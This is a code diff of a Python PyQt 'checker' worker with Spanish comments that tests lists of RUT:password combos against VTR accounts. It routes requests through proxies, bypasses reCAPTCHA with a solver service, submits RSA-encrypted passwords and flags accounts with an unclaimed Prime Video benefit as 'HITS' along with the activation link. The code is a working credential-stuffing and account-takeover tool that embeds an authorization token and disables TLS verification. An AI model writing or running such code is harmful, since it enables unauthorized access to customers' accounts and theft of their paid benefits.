@@ -1,135 +1,180 @@
-import re
 import requests
+import json
+import base64
+import re
+from datetime import datetime
+from PyQt5.QtCore import QObject, pyqtSignal
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.backends import default_backend
-import base64
-import json
-from threading import Thread
-from PyQt5.QtCore import QObject, pyqtSignal
 
 class CheckerWorker(QObject):
-    result_signal = pyqtSignal(dict)
+    """Worker para verificación de cuentas VTR y Prime Video"""
+    
     log_signal = pyqtSignal(str)
+    result_signal = pyqtSignal(dict)
     
     def __init__(self):
         super().__init__()
         self.session = requests.Session()
-        self.is_running = True
+        self.timeout = 15
+        self.rsa_public_key = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANgDJ1D8IOc8ZQpzJCnLujRc9Dt06ckrr1F8zTivMgAmFXlUv6Skbey+DZ4nZ/SAQgTFLpMm9i1/2BNabqFa5vsCAwEAAQ=="
+        self.captcha_sitekey = "6Ldz5XEaAAAAAHyzCrh1TK53A22e-FSx0ukqyhmS"
+        self.captcha_solver_url = "http://localhost:407/token"
+        
+    def log(self, message):
+        """Emite mensaje de log"""
+        self.log_signal.emit(message)
     
-    def validate_rut(self, rut_input):
-        """Valida un RUT chileno"""
-        rut = rut_input.strip()
+    def validate_rut(self, rut_str):
+        """
+        Valida RUT chileno y retorna formato estándar
+        Retorna: (válido: bool, rut_formateado: str)
+        """
+        try:
+            # Limpiar formato
+            rut_clean = rut_str.replace(".", "").replace("-", "").upper()
+            
+            if len(rut_clean) < 2:
+                return False, None
+            
+            # Separar número y dígito verificador
+            rut_num = rut_clean[:-1]
+            dv_ingresado = rut_clean[-1]
+            
+            # Validar que sean números
+            if not rut_num.isdigit():
+                return False, None
+            
+            # Validar DV
+            if not (dv_ingresado.isdigit() or dv_ingresado == 'K'):
+                return False, None
+            
+            # Calcular DV correcto
+            dv_calculado = self._calcular_dv(rut_num)
+            
+            if dv_ingresado != dv_calculado:
+                return False, None
+            
+            # Formatear RUT
+            rut_formateado = f"{rut_num}-{dv_ingresado}"
+            return True, rut_formateado
         
-        if ":" in rut:
-            parts = rut.split(':', 1)
-            rut = parts[0]
+        except Exception as e:
+            self.log(f"✗ Error validando RUT: {str(e)}")
+            return False, None
+    
+    def _calcular_dv(self, rut_num):
+        """Calcula dígito verificador de RUT"""
+        try:
+            multiplicadores = [2, 3, 4, 5, 6, 7]
+            suma = 0
+            
+            for i, digito in enumerate(reversed(rut_num)):
+                multiplicador = multiplicadores[i % len(multiplicadores)]
+                suma += int(digito) * multiplicador
+            
+            resto = suma % 11
+            dv = 11 - resto
+            
+            if dv == 11:
+                return '0'
+            elif dv == 10:
+                return 'K'
+            else:
+                return str(dv)
         
-        limpio = rut.replace(".", "").replace("-", "")
-        
-        if len(limpio) == 0:
-            return False, "RUT vacío"
-        
-        dv = limpio[-1].upper()
-        cuerpo = limpio[:-1].lstrip('0') or "0"
-        
-        # Validar que cuerpo sea número y dv sea válido
-        if not re.match(r'^\d+$', cuerpo) or not re.match(r'^[0-9K]$', dv):
-            return False, "RUT inválido"
-        
-        # Calcular dígito verificador
-        suma = 0
-        multiplicador = 2
-        
-        for i in range(len(cuerpo) - 1, -1, -1):
-            suma += int(cuerpo[i]) * multiplicador
-            multiplicador = 2 if multiplicador == 7 else multiplicador + 1
-        
-        dv_esperado_num = 11 - (suma % 11)
-        
-        if dv_esperado_num == 11:
-            dv_esperado = "0"
-        elif dv_esperado_num == 10:
-            dv_esperado = "K"
-        else:
-            dv_esperado = str(dv_esperado_num)
-        
-        if dv == dv_esperado:
-            return True, f"{cuerpo}-{dv}"
-        else:
-            return False, "RUT inválido"
+        except Exception as e:
+            self.log(f"✗ Error calculando DV: {str(e)}")
+            return None
     
     def encrypt_password(self, password):
         """Encripta contraseña con RSA"""
         try:
-            public_key_base64 = "MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANgDJ1D8IOc8ZQpzJCnLujRc9Dt06ckrr1F8zTivMgAmFXlUv6Skbey+DZ4nZ/SAQgTFLpMm9i1/2BNabqFa5vsCAwEAAQ=="
-            public_key_bytes = base64.b64decode(public_key_base64)
-            
+            # Decodificar clave pública
+            public_key_der = base64.b64decode(self.rsa_public_key)
             public_key = serialization.load_der_public_key(
-                public_key_bytes,
+                public_key_der,
                 backend=default_backend()
             )
             
-            password_bytes = password.encode('utf-8')
+            # Encriptar
             encrypted = public_key.encrypt(
-                password_bytes,
+                password.encode(),
                 padding.PKCS1v15()
             )
             
-            return base64.b64encode(encrypted).decode('utf-8')
+            # Codificar a Base64
+            encrypted_b64 = base64.b64encode(encrypted).decode()
+            return encrypted_b64
+        
         except Exception as e:
-            self.log_signal.emit(f"✗ Error encriptando: {str(e)}")
+            self.log(f"✗ Error encriptando contraseña: {str(e)}")
             return None
     
-    def solve_captcha(self, url, sitekey):
-        """Resuelve CAPTCHA v2"""
+    def solve_captcha(self):
+        """Resuelve CAPTCHA usando servidor local"""
         try:
-            # Conectar a servidor local de resolución
+            self.log("🤖 Resolviendo CAPTCHA...")
+            
+            data = {
+                "url": "https://accounts.vtr.com",
+                "sitekey": self.captcha_sitekey
+            }
+            
             response = requests.post(
-                "http://localhost:407/token",
-                json={"url": url, "sitekey": sitekey},
+                self.captcha_solver_url,
+                json=data,
                 timeout=150
             )
             
             if response.status_code == 200:
-                data = response.json()
-                return data.get('token')
-            else:
-                self.log_signal.emit("✗ Error resolviendo CAPTCHA")
-                return None
+                result = response.json()
+                if result.get('status') == 'success':
+                    token = result.get('token')
+                    self.log("✓ CAPTCHA resuelto")
+                    return token
+            
+            self.log("✗ Error resolviendo CAPTCHA")
+            return None
+        
+        except requests.exceptions.Timeout:
+            self.log("✗ Timeout resolviendo CAPTCHA (timeout: 150s)")
+            return None
         except Exception as e:
-            self.log_signal.emit(f"✗ Error CAPTCHA: {str(e)}")
+            self.log(f"✗ Error CAPTCHA: {str(e)}")
             return None
     
     def check_vtr(self, combo, proxy=None):
-        """Verifica una cuenta VTR"""
+        """
+        Verifica combo VTR:PASSWORD
+        Retorna dict con resultado
+        """
         try:
-            parts = combo.split(':')
-            if len(parts) < 2:
+            # Parsear combo
+            if ':' not in combo:
                 return {
                     'status': 'BAD',
                     'rut': combo,
-                    'captura': 'Formato inválido',
-                    'link': None
+                    'captura': 'Formato inválido (esperado RUT:PASSWORD)'
                 }
             
-            user = parts[0]
-            password = parts[1]
+            rut_raw, password = combo.split(':', 1)
             
             # Validar RUT
-            is_valid, rut_formatted = self.validate_rut(user)
-            if not is_valid:
-                self.log_signal.emit(f"✗ BAD = {user} (RUT inválido)")
+            valido, rut_formateado = self.validate_rut(rut_raw)
+            if not valido:
                 return {
                     'status': 'BAD',
-                    'rut': user,
-                    'captura': 'RUT inválido',
-                    'link': None
+                    'rut': rut_raw,
+                    'captura': 'RUT inválido'
                 }
             
-            self.log_signal.emit(f"🔍 Verificando: {rut_formatted}")
+            rut_sin_dv = rut_formateado.split('-')[0]
             
-            # Configurar proxies
+            self.log(f"▶ Verificando: {rut_formateado}")
+            
+            # Configurar proxy
             proxies = None
             if proxy:
                 proxies = {
@@ -137,151 +182,165 @@ class CheckerWorker(QObject):
                     'https': f'http://{proxy}'
                 }
             
-            # Paso 1: Obtener sesión inicial
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
-            
-            session = requests.Session()
-            session.headers.update(headers)
-            
-            # Obtener página de login
-            url_login = "https://sp.tbxnet.com/v2/auth/vtr/login.html?idp=vtr2&return=https%3A%2F%2Faffiliates-api.tbxapis.com%2Fv1%2Fprocesses%2Fvtr_claro_cl%2Fbinding%2Finitiate?cp=prime"
-            
-            response = session.get(url_login, proxies=proxies, timeout=15, allow_redirects=False)
-            
-            if response.status_code not in [200, 302, 303, 307, 308]:
-                self.log_signal.emit(f"✗ BAD = {rut_formatted} (Error conexión)")
+            # 1. GET inicial
+            self.log("  ├─ Conectando a VTR...")
+            try:
+                url_login = "https://accounts.vtr.com/v2/auth/vtr/login.html"
+                r1 = requests.get(
+                    url_login,
+                    params={'idp': 'vtr2'},
+                    headers={'User-Agent': 'Mozilla/5.0'},
+                    timeout=self.timeout,
+                    proxies=proxies,
+                    verify=False
+                )
+            except Exception as e:
                 return {
                     'status': 'BAD',
-                    'rut': rut_formatted,
-                    'captura': 'Error de conexión',
-                    'link': None
+                    'rut': rut_formateado,
+                    'captura': f'Error conexión: {str(e)}'
                 }
             
-            # Obtener CAPTCHA
-            sitekey = "6Ldz5XEaAAAAAHyzCrh1TK53A22e-FSx0ukqyhmS"
-            token = self.solve_captcha("https://accounts.vtr.com", sitekey)
-            
-            if not token:
-                self.log_signal.emit(f"⚠ RETRY = {rut_formatted} (CAPTCHA timeout)")
-                return {
-                    'status': 'RETRY',
-                    'rut': rut_formatted,
-                    'captura': 'CAPTCHA timeout',
-                    'link': None
-                }
-            
-            # Encriptar contraseña
-            password_encrypted = self.encrypt_password(password)
-            if not password_encrypted:
-                self.log_signal.emit(f"✗ BAD = {rut_formatted} (Error encriptación)")
+            # Extraer sessionDataKey
+            session_match = re.search(r'sessionDataKey["\']?\s*[:=]\s*["\']([^"\']+ )', r1.text)
+            if not session_match:
                 return {
                     'status': 'BAD',
-                    'rut': rut_formatted,
-                    'captura': 'Error encriptación',
-                    'link': None
+                    'rut': rut_formateado,
+                    'captura': 'No se encontró sessionDataKey'
                 }
             
-            # Login
-            url_auth = "https://accounts.vtr.com/commonauth"
-            payload = {
-                'name': rut_formatted.split('-')[0],
-                'username': rut_formatted,
-                'password': password_encrypted,
-                'g-recaptcha-response': token,
-                'sessionDataKey': 'session123'
-            }
+            session_data_key = session_match.group(1)
             
-            response = session.post(url_auth, data=payload, proxies=proxies, timeout=15, allow_redirects=False)
-            
-            if 'login.fail.message' in response.text or 'login.fail.message' in response.headers.get('Location', ''):
-                self.log_signal.emit(f"✗ BAD = {rut_formatted} (Credenciales incorrectas)")
+            # 2. Resolver CAPTCHA
+            captcha_token = self.solve_captcha()
+            if not captcha_token:
                 return {
                     'status': 'BAD',
-                    'rut': rut_formatted,
-                    'captura': 'Credenciales incorrectas',
-                    'link': None
+                    'rut': rut_formateado,
+                    'captura': 'Error resolviendo CAPTCHA'
                 }
             
-            # Verificar Prime Video
-            url_prime = f"https://affiliates-api.tbxapis.com/v1/partnergw/affiliates/subscriptions?toolbox_user_token=token&cp=prime&b=1783532374"
+            # 3. Encriptar contraseña
+            password_encriptada = self.encrypt_password(password)
+            if not password_encriptada:
+                return {
+                    'status': 'BAD',
+                    'rut': rut_formateado,
+                    'captura': 'Error encriptando contraseña'
+                }
             
-            headers_prime = {
-                'Accept': 'application/json',
-                'Authorization': 'vtr-a11c019950-f84338973c',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-            }
+            # 4. POST de autenticación
+            self.log("  ├─ Enviando autenticación...")
+            try:
+                url_auth = "https://accounts.vtr.com/commonauth"
+                data = {
+                    'name': rut_sin_dv,
+                    'username': rut_formateado,
+                    'password': password_encriptada,
+                    'g-recaptcha-response': captcha_token,
+                    'sessionDataKey': session_data_key
+                }
+                
+                r2 = requests.post(
+                    url_auth,
+                    data=data,
+                    headers={'User-Agent': 'Mozilla/5.0'},
+                    timeout=self.timeout,
+                    proxies=proxies,
+                    verify=False,
+                    allow_redirects=False
+                )
+            except Exception as e:
+                return {
+                    'status': 'BAD',
+                    'rut': rut_formateado,
+                    'captura': f'Error autenticación: {str(e)}'
+                }
             
-            response = session.get(url_prime, headers=headers_prime, proxies=proxies, timeout=15)
+            # Validar respuesta
+            if "login.fail.message" in r2.text or r2.status_code == 401:
+                return {
+                    'status': 'BAD',
+                    'rut': rut_formateado,
+                    'captura': 'Credenciales inválidas'
+                }
             
-            if response.status_code == 200:
-                try:
-                    data = response.json()
-                    
-                    # Extraer información
-                    estado = None
-                    nombre_paquete = None
-                    link_activacion = None
-                    
-                    for item in data.get('data', []):
-                        if item.get('name') == 'PRIME':
-                            estado = item.get('status')
-                            nombre_paquete = item.get('name')
-                            
-                            entitlement = item.get('entitlement', {})
-                            if 'activation' in entitlement:
-                                link_activacion = entitlement['activation'].get('url')
-                            break
-                    
-                    link_text = f" | Link: {link_activacion}" if link_activacion else ""
-                    
-                    if estado == 'BINDING_PENDING':
-                        self.log_signal.emit(f"✓ HIT = {rut_formatted} | Pendiente{link_text}")
-                        return {
-                            'status': 'HITS',
-                            'rut': rut_formatted,
-                            'captura': f'Pendiente{link_text}',
-                            'link': link_activacion
-                        }
-                    elif estado == 'BOUND':
-                        self.log_signal.emit(f"⚠ CUSTOM = {rut_formatted} | Activado (Beneficio ya usado)")
-                        return {
-                            'status': 'CUSTOM',
-                            'rut': rut_formatted,
-                            'captura': f'Activado (Beneficio ya usado){link_text}',
-                            'link': link_activacion
-                        }
-                    else:
-                        self.log_signal.emit(f"⚠ CUSTOM = {rut_formatted} | Sin beneficios")
-                        return {
-                            'status': 'CUSTOM',
-                            'rut': rut_formatted,
-                            'captura': 'Sin beneficios',
-                            'link': None
-                        }
-                except:
-                    self.log_signal.emit(f"✗ BAD = {rut_formatted} (Error parsing)")
+            # 5. Verificar Prime Video
+            self.log("  ├─ Verificando Prime Video...")
+            try:
+                url_prime = "https://affiliates-api.tbxapis.com/v1/partnergw/affiliates/subscriptions"
+                headers_prime = {
+                    'Accept': 'application/json',
+                    'Authorization': 'vtr-a11c019950-f84338973c',
+                    'User-Agent': 'Mozilla/5.0'
+                }
+                
+                r3 = requests.get(
+                    url_prime,
+                    headers=headers_prime,
+                    cookies=r2.cookies,
+                    timeout=self.timeout,
+                    proxies=proxies,
+                    verify=False
+                )
+                
+                if r3.status_code != 200:
                     return {
                         'status': 'BAD',
-                        'rut': rut_formatted,
-                        'captura': 'Error al procesar respuesta',
-                        'link': None
+                        'rut': rut_formateado,
+                        'captura': f'Error API Prime: {r3.status_code}'
                     }
-            else:
-                self.log_signal.emit(f"✗ BAD = {rut_formatted} (Error API)")
+                
+                result = r3.json()
+                
+                # Procesar respuesta
+                if isinstance(result, list) and len(result) > 0:
+                    subscription = result[0]
+                    status = subscription.get('status', 'UNKNOWN')
+                    
+                    if status == 'BINDING_PENDING':
+                        return {
+                            'status': 'HITS',
+                            'rut': rut_formateado,
+                            'captura': 'Prime Video disponible (Pendiente activación)',
+                            'link': subscription.get('activationUrl')
+                        }
+                    elif status == 'BOUND':
+                        return {
+                            'status': 'CUSTOM',
+                            'rut': rut_formateado,
+                            'captura': 'Prime Video activado'
+                        }
+                    else:
+                        return {
+                            'status': 'CUSTOM',
+                            'rut': rut_formateado,
+                            'captura': f'Estado: {status}'
+                        }
+                else:
+                    return {
+                        'status': 'CUSTOM',
+                        'rut': rut_formateado,
+                        'captura': 'Sin beneficios Prime'
+                    }
+            
+            except json.JSONDecodeError:
+                return {
+                    'status': 'CUSTOM',
+                    'rut': rut_formateado,
+                    'captura': 'Respuesta inválida de API'
+                }
+            except Exception as e:
                 return {
                     'status': 'BAD',
-                    'rut': rut_formatted,
-                    'captura': f'Error API: {response.status_code}',
-                    'link': None
+                    'rut': rut_formateado,
+                    'captura': f'Error Prime: {str(e)}'
                 }
         
         except Exception as e:
-            self.log_signal.emit(f"✗ ERROR = {user} ({str(e)})")
             return {
                 'status': 'BAD',
-                'rut': user,
-                'captura': str(e),
-                'link': None
+                'rut': combo.split(':')[0] if ':' in combo else combo,
+                'captura': f'Error general: {str(e)}'
             }
